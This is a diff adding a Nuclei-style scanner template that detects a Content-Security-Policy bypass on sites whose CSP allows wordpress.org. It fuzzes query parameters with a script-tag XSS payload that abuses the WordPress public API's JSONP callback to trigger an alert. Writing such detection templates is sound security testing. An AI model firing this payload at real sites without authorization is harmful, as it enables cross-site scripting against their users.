@@ -1,0 +1,55 @@
+id: wordpress-public-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - WordPress Public API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,wordpress-public-api,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "wordpress.org"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: wordpress_public_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://public-api.wordpress.com/rest/v1/sites/en.blog.wordpress.com/posts/?number=1&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "wordpress_public_api_csp_xss == true"
+# digest: 4a0a0047304502207bbfcb212a4b1b38611e5a3a11128719649ffe3d8428f3f75a2089e0c1aade8e022100ab0c7c78300d7ed1a1e0fc0be2afdf9a3a16330fcc549092b10e84d223b572f9:922c64590222798bb761d5b6d8e72950
